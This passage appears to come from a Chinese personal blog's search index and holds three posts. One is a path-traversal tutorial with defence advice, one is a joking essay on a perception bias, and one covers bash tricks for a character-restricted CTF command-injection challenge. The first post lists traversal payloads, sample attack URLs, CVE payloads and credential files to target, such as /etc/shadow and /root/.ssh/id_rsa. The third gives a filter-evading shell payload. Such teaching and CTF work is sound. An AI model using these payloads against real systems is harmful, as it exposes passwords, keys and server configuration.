编码来绕过服务器对 . 或者 / 的检测</p><blockquote><p>.  =&gt; %2c</p><p>/  =&gt; %2f</p><p>% =&gt; %25 (双重URL编码)</p></blockquote><h2 id="0x04-绝对路径配合"><a href="#0x04-绝对路径配合" class="headerlink" title="0x04 绝对路径配合 ../"></a>0x04 绝对路径配合 ../</h2><p>有些 web 在获取文件时，会首先判断是否以一个固定的路径开头</p><p>那么就可以配合 ../ 来返回上一级遍历任意文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x05-截断文件后缀"><a href="#0x05-截断文件后缀" class="headerlink" title="0x05 截断文件后缀"></a>0x05 截断文件后缀</h2><p>某些 web 对文件类型作了限制，只有当后缀为图片时才解析</p><p>这时候就可以利用 %00 来截断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00.jpg</span><br></pre></td></tr></table></figure><h2 id="0x0x"><a href="#0x0x" class="headerlink" title="0x0x"></a>0x0x</h2><p>要读取根目录下的文件的话 ../ 可以随意拼接任意个，就像 ../../../../../../../../../../../../../../../../../../../../../../</p><p>因为到了根目录再返回上级目录依然是根目录</p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>防止文件路径遍历漏洞的最有效方法是避免将用户提供的输入完全传递给文件系统API</p><p>如果认为不可避免的是将用户提供的输入传递给文件系统 API，则应同时使用两层防御，以防止受到攻击：</p><blockquote><ul><li>应用程序应在处理之前验证用户输入。理想情况下，验证应与允许值的白名单进行比较。如果所需的功能无法做到这一点，则验证应验证输入内容仅包含允许的内容，例如纯字母数字字符</li><li>验证提供的输入后，应用程序应将输入附加到基本目录，并使用平台文件系统 API 规范化路径。验证规范化路径以预期的基本目录开头</li></ul></blockquote><h1 id="攻击路径整理"><a href="#攻击路径整理" class="headerlink" title="攻击路径整理"></a>攻击路径整理</h1><h2 id="文件整理"><a href="#文件整理" class="headerlink" title="文件整理"></a>文件整理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\drivers\etc\hosts #Win10</span><br><span class="line">C:\boot.int  #Win7 隐藏文件</span><br><span class="line">web.xml  #Java Web项目配置文件  </span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line">C:\Program Files\mysql\my.ini  #Mysql下配置文件</span><br><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;group</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;.htaccess</span><br><span class="line">&#x2F;phpinfo.php</span><br><span class="line">&#x2F;inc&#x2F;db.php</span><br><span class="line">&#x2F;inc&#x2F;conn.php</span><br><span class="line">&#x2F;Windows&#x2F;system.ini</span><br><span class="line"></span><br><span class="line"># Tomcat</span><br><span class="line">&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># Windows + IIS + asp</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;scripts&#x2F;..%5c..&#x2F;Windows&#x2F;System32&#x2F;cmd.exe?&#x2F;c+dir+c:\  # 老版本 - IIS CGI文件名解码漏洞</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;show.asp?view&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;Windows&#x2F;system.ini</span><br></pre></td></tr></table></figure><h2 id="路径整理"><a href="#路径整理" class="headerlink" title="路径整理"></a>路径整理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">xx.php?vt&#x3D;&amp;cate&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;doc&#x2F;index?md&#x3D;diagnose_api&amp;app&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;pcheck&#x2F;index.php?action&#x3D;showPcheck&amp;report&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;xx&#x2F;img.php?s&#x3D;16,40&amp;n&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;2xx.xx.xx.xx:8080&#x2F;xampp&#x2F;showcode.php&#x2F;c:xampp&#x2F;htdocs&#x2F;xampp&#x2F;showcode.php?showcode&#x3D;1</span><br><span class="line">https:&#x2F;&#x2F;xx.xx.com&#x2F;static&#x2F;images&#x2F;couch-ipad.png..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;frame_scc&#x2F;downLoad?template&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.12.22.xx&#x2F;downloadFile.do?fileName&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="CVE-2014-3625"><a href="#CVE-2014-3625" class="headerlink" title="CVE-2014-3625"></a>CVE-2014-3625</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;passwd </span><br><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="CVE-2018-1271"><a href="#CVE-2018-1271" class="headerlink" title="CVE-2018-1271"></a>CVE-2018-1271</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;spring-mvc-showcase&#x2F;resources&#x2F;xxx&#x2F;..%5c&#x2F;..%5c&#x2F;..%5c&#x2F;windows&#x2F;win.ini</span><br></pre></td></tr></table></figure><h2 id="路径遍历检测"><a href="#路径遍历检测" class="headerlink" title="路径遍历检测"></a>路径遍历检测</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;known_hosts</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;root&#x2F;.bash_history</span><br><span class="line">&#x2F;root&#x2F;.mysql_history</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;fd[0-9]*(文件标识符)</span><br><span class="line">&#x2F;proc&#x2F;mounts</span><br><span class="line">&#x2F;proc&#x2F;config.gz&#x2F;etc&#x2F;my.cnf</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD</span><br><span class="line">C:\Windows\php.in</span><br><span class="line">C:\Windows\my.ini</span><br><span class="line">C:\boot.int</span><br><span class="line">C:\Windows\System32\inetsrc\MetaBase.xml</span><br><span class="line">C:\Windows\repair\sam</span><br><span class="line">..&#x2F;..&#x2F;ierp&#x2F;bin&#x2F;prop.xml</span><br></pre></td></tr></table></figure><h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Apache</span><br><span class="line">在httpd.conf文件中找到   Options +Indexes +FollowSymLinks +ExecCGI  并修改成   Options -Indexes+FollowSymLinks +ExecCGI  并保存</span><br><span class="line"></span><br><span class="line">Tomcat</span><br><span class="line">修改conf&#x2F;web.xml，将true 改为false 重启tomcat</span><br><span class="line"></span><br><span class="line">IIS</span><br><span class="line">1、在服务器端，打开 控制面板 --&gt;管理工具--&gt; IIS管理器</span><br><span class="line">2、右击默认网站 --&gt; 属性--&gt; 主目录 --&gt;取消“目录浏览”复选框</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小谈性知觉偏差导致蜜汁自信</title>
      <link href="2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/"/>
      <url>2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<p>人生三大错觉：📱振动、👴能反杀（👴确实可以反杀，确实可以啊！）、她喜欢👴</p><p>”Ta喜欢👴为甚么还不承认“，或许可以用性知觉偏差来解释。</p><p>虽然按理来说”Ta明明暗恋我，就是不肯勇敢承认自己的感情“这种错觉是不分男女的，但是一般来说基本上是男性占比多，对于一个普通的、正常的、友好的表示，男性普遍性地容易误解为爱情，在两性中虽然都会有认知不正确的时候，但是男性更容易产生这种Ta喜欢我的夸大型性知觉偏差。</p><hr><p>心理学家做过的研究：</p><p>​    找一些男女大学生来观看某个录像，录像内容是一个教授和一个女学生谈话，女学生想要论文延期，教授和女学生交流得比较友好，嗷，两个演技很精湛的演员也注意了仅仅只是表现友好，不要表现得轻浮和挑逗。</p><p>结果：</p><p>​    女生们：录像中只看到女孩子的友好，关于性感、性诱惑这类的没看出来，而男生们则纷纷表示看出来这个女孩子明显有性方面的展现和诱惑。</p><p>另外的一个研究：</p><p>​    看的是两个男女同学互相在学习的照片，然后图片中的女孩子对这个男的有没有意思。</p><p>结果：</p><p>​    大部分女生看到（觉得）没有啊，两个人很正常啊，但男生一看不对，这个女孩子对这个男孩子有意思，有意思，肯定有意思哈，男生们普遍认为照片中的女孩子心不在焉，心不在学习，表现出了很明显的性感和对男孩子的诱惑。</p><hr><p>这些偏差也并不只适用于普信男（普通而又自信），也适用于一些具有较高配偶价值的人，就比如男领导，事业有成型男人更容易产生这种错觉，欸，👴的女下属这些人对👴有意思奥，所以一些工作场景中的性骚扰问题也源于此 。</p><p>女性明明只是一种友好的表示，但对方却往往可以误解为她是对我心有所属，更有意思的是，当男性遇到漂亮的性感的女性的时候更容易产生这种偏差，主要想一想，人家漂亮的妹子择偶标准都已经够高了，为甚么就这么那啥而不知呢。</p><p>其原因就在于漫长的人类进化过程中，我们知道，两性从进化的根源上来讲，Ta们的性选择、择偶策略是不同的，女性由于孩子的抚养等问题需要一个稳定有资源的男士，所以女性在择偶中都是很慎重的，而男性则不然，Ta在整个生殖过程所负担的并不是那么多，所以男性会追求更多的异性，在更多的两性欢愉之中才能提升自己基因传递下去的比率。</p><p>对于男性而言，Ta对女性的情感认知容易犯两方面错误，一是对方对👴没意思，而👴觉得对方有意思，这是一种误报，另外是对方对👴有意思，而👴判断Ta没意思，这是一种漏报，两种错误权衡下来，男性做出的选择是：宁可误报，不可漏报，宁可错杀一千，不能放过一个。</p><p>进化的动力让男性把任何的女性的好感都解释为性方面的兴趣，所以有了典型的微笑当爱情这种搞法，说白了，这一类的男性呢，就是用下半身思考的动物。</p><p>不过最后还是说一句，并不是所有的男性都是这个样子，本文也只是图一乐，开开玩笑，调侃几句。</p><p>差不多得了，溜之。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些shell的骚操作</title>
      <link href="2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
      <url>2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="构造任意数字"><a href="#构造任意数字" class="headerlink" title="构造任意数字"></a>构造任意数字</h1><p>很久之前无意间发现 <code>$(())</code> 这个好玩的玩意儿，有过一波深♂入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(()) = 0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">((~$(()))) = -1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="comment"># = 0</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> $((!<span class="variable">$#</span>)) = 1 (似乎不彳亍)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">##&#125; = 1</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>)) = 2</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#0&#125; = 4</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过二进制 11 转换为十进制得到 3,4,5,6,7</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))<span class="comment">#$&#123;##&#125;$&#123;##&#125;)) = 3</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">((<span class="variable">$&#123;##&#125;</span>&lt;&lt;$((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>)))) = 4</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))<span class="comment">#$&#123;##&#125;0$&#123;##&#125;)) = 5</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))<span class="comment">#$&#123;##&#125;$&#123;##&#125;0)) = 6</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))<span class="comment">#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;)) = 7</span></span></span><br></pre></td></tr></table></figure><h2 id="利用-以及数字构造任意数"><a href="#利用-以及数字构造任意数" class="headerlink" title="利用 $ ( ) # 以及数字构造任意数"></a>利用 $ ( ) # 以及数字构造任意数</h2><p><code>$((2#1000001)) = 53</code></p><p>形式: <code>$((2#&#123;二进制&#125;))) = &#123;八进制&#125;</code></p><h2 id="利用-构造任意数"><a href="#利用-构造任意数" class="headerlink" title="利用 $ ( ) ~ 构造任意数"></a>利用 $ ( ) ~ 构造任意数</h2><p>以 <code>$(($(($a))$(($b))$(($c))$(($d))$(($e))$(($f))))</code> 为例子吧：</p><h3 id="含有任何负数的情况"><a href="#含有任何负数的情况" class="headerlink" title="含有任何负数的情况"></a>含有任何负数的情况</h3><p>只要有任意 <code>$(($n))</code> 为负数，则表达式的结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果是正数，则拼接到前一位的末尾</span><br><span class="line">如果是负数，则与前面分开</span><br></pre></td></tr></table></figure><p>比如：<code>$(($((1))$((0))$((-1))$((1))$((2))$((1))))</code> 的情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 1 0 -1 1 2 1</span><br><span class="line">=&gt; (10) + (-1121)</span><br><span class="line">=&gt; -1111</span><br></pre></td></tr></table></figure><p>或者：<code>$(($((-1))$((0))$((-1))$((1))$((2))$((1))))</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((-<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; -1 0 -1 1 2 1</span><br><span class="line">=&gt; (-10) + (-1121)</span><br><span class="line">=&gt; -1131</span><br></pre></td></tr></table></figure><p>亦或者：<code>$(($((6))$((0))$((-1))$((1))$((-3))$((1))))</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">6</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((-<span class="number">3</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 6 0 -1 1 -3 1</span><br><span class="line">=&gt; (60) + (-11) + (-31)</span><br><span class="line">=&gt; 18</span><br></pre></td></tr></table></figure><h3 id="a-为-0-的情况"><a href="#a-为-0-的情况" class="headerlink" title="$(($a)) 为 0 的情况"></a>$(($a)) 为 0 的情况</h3><p>当 <code>$(($a))</code> 为 0，且其它都为非负数时，整个表达式的结果最后为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">f * 2 ** 0 + <span class="variable">$e</span> * 2 ** 3 + <span class="variable">$d</span> * 2 ** 6 + <span class="variable">$c</span> * 2 ** 9 ······</span></span><br><span class="line">即从最后的 $(($n)) 开始，往前推，直到第一位</span><br></pre></td></tr></table></figure><h3 id="全部为正数的情况"><a href="#全部为正数的情况" class="headerlink" title="全部为正数的情况"></a>全部为正数的情况</h3><p>如果所有的 <code>$(($n))</code> 都为正数，则全部拼接在一起输出……</p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>前不久想折磨一下大一新生，特意去研究了一下</p><p>现在抛出一个问题：现在👴试图读出 /flag.txt 文件，但是👴被限制了字符，只允许使用如下字符，怎解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt; $ ? : ; . &#123; &#125; ~</span><br><span class="line">A D E F H I L M N O P R T S U V</span><br></pre></td></tr></table></figure><p>我们首先看一下，没有小写字母，直接执行命令是不可能的，然后只能想到利用 <code>/bin/cat</code> 这一类的来尝试一下，但是 / 也被过滤了，这个时候我们就要思考一下 / 从哪里来了</p><p>给了大写字母和 $ { } 可以尝试一下利用环境变量，env 这个指令可以获取环境变量，不同人的机子不一样，环境变量也不一样，可能会有所出入，但是我的是 ok 的，所以相信大家的都 ok</p><p>因为 <code>PATH</code> 是 <code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</code>，所以我们可以尝试取它的第一位，就可以获得 / 了，然后又有 <code>SHELL</code> 为 <code>/bin/bash</code>，所以我们也可以尝试取它的前五位，就是 <code>/bin/</code>，然后就只要考虑后面用哪个命令读取了，但是问题就来了，题目并没有给👴数字，那👴怎么办呢，很简单</p><hr><p>shell 中运行的每个命令都使用退出状态码（exit status）来告诉shell 它完成了处理。退出状态码是一个 0 ~ 255 之间的整数值，在命令结束运行时由命令传给shell</p><p>Linux 使用了 $? 这个专属变量来保存上个执行的命令的退出状态码</p><hr><p>所以我们可以利用 $?  来榨取一个数字，但是我们可以榨取到哪个数字呢，又是否对我们的操作有帮助呢</p><p>Linux 的错误状态退出状态码没有什么标准可遵循，但有一些参考</p><table><thead><tr><th>状态码</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>命令成功结束</td></tr><tr><td>1</td><td>一般性未知错误</td></tr><tr><td>2</td><td>不适合的 shell 命令</td></tr><tr><td>123</td><td>命令不可执行</td></tr><tr><td>127</td><td>没找到命令</td></tr><tr><td>128</td><td>无效退出参数</td></tr><tr><td>128+x</td><td>与 Linux 信号x相关的严重错误</td></tr><tr><td>130</td><td>通过 ctrl+c 终止的命令</td></tr><tr><td>255</td><td>正常范围之内的退出状态码</td></tr></tbody></table><p>emm，”一般性未知错误“</p><p><img src="https://i.loli.net/2021/04/24/DBCWrJxRAa9ctny.png"></p><p>彳亍，那我们就有一个 1 了，不过 2 啥的还没找到咋搞，不过有一个 1 就够了，因为我们还有一个 <code>RANDOM</code> 环境变量可以利用：<code>&lt;A;echo $&#123;RANDOM:~A:$?&#125;</code>，介个样子就可以取到一位随机数了，很玄学的一个地方就是 <code>~A</code> 这个玩意儿似乎在 <code>$&#123;&#125;</code> 可以取到环境变量的最后一位的位置，利用这个点可以玩很多骚的</p><p><img src="https://i.loli.net/2021/04/24/xoP3ThNclKmziE2.png"></p><p>好了，随机个位数字也来了，我们只需要这样：<code>&lt;A;echo $&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;</code>，随机到一个 5 就可以获得 <code>/bin/</code> 辣，那么怎么读文件呢，看了蛮久的 env 后发现，似乎用 tac 是最好的选择，因为最后一位的 t 蛮多的，比如 HOME，USER，MAIL（我的反正是）</p><p><img src="https://i.loli.net/2021/04/24/5SOdXyIuqklrJTm.png"></p><p>然后空格用 $IFS 随便过了，最后文件马马虎虎一个 <code>$&#123;PATH::$?&#125;????.???</code> 代替了 /flag.txt，最终 payload：<code>&lt;A;$&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;$&#123;USER:~A:$?&#125;??$IFS$&#123;PATH::$?&#125;????.???</code></p><p>你别说，我还真读出来了奥</p><p><img src="https://i.loli.net/2021/04/24/PZC6YcRTd2xHIJu.jpg"></p><p>但是很奇怪的一点，就是 <code>/bin/t?? flag.txt</code> 的时候会出现前上图一大串奇怪的乱码，但是直接 <code>/bin/tac flag.txt</code> 不会</p><p><img src="https://i.loli.net/2021/04/24/JPpEVxyIgN9vFsR.png"></p><p>这一点不咋理解，但是无伤大雅</p><p>最后再来一个，我把 &lt; 或者 $? 过滤（就是这俩货连在一起就过滤）的话应该怎么办？</p><p>很简单，用 <code>SHIVL</code> 就 ok 了，SHIVL=1</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>这会想继续折磨一下大一新生，结合了一下前面的构造数字，应该挺简单的，不秒掉的话就要打PP</p><p>ok，现在抛出一个问题：现在👴试图读出 /flag.txt 文件，但是👴被限制了字符，只允许使用如下字符，怎解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ : &#123; &#125; ( ) #</span><br><span class="line">A D E F H I L M N O P R T S U</span><br></pre></td></tr></table></figure><p><del>先不写了，👴也还没仔细想，只是觉得这样可以出，这周末课设，太烦了，睡了</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
